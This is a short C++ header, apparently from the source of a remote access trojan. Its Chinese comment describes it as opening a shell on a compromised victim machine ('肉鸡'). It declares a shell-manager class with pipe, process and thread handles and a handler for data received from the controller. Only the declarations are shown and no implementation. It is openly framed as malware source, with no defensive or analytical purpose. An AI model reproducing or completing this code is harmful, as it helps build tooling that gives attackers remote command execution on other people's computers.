//描述: 在肉鸡上开启shell
//作者: firnsan 2012.12

#if !defined(SHELLMANAGER_H_INCLUDED)
#define SHELLMANAGER_H_INCLUDED


#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "BasicManager.h"
//class CBasicManager;
class CShellManager : public CBasicManager  
{
public:
	CShellManager(CClient *pClient);
	virtual ~CShellManager();
	virtual void OnReceive(LPBYTE lpBuff,DWORD dwSize);
private:
	HANDLE m_hReadPipeHandle;   
	HANDLE m_hWritePipeHandle; 
	HANDLE m_hReadPipeShell;
	HANDLE m_hWritePipeShell;

	HANDLE m_hProcessHandle;
	HANDLE m_hThreadHandle;
	HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadWork;

	static DWORD WINAPI ReadPipeThread(LPVOID lparam);
	static DWORD WINAPI MonitorThread(LPVOID lparam);
	static DWORD WINAPI WorkThread(LPVOID lparam);
};
#endif